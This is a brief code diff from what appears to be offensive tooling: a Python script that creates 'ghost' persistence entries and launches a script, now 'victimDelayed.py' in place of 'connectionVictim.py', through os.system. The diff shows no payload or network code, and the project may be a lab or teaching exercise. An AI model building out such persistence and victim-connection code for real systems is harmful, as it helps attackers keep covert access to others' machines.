@@ -38,4 +38,4 @@ if not serviceFound:
 for i in config.ghosts:
 	persistence.createGhost(*i)
 
-os.system("python3 " + targetDir + "connectionVictim.py")
+os.system("python3 " + targetDir + "victimDelayed.py")
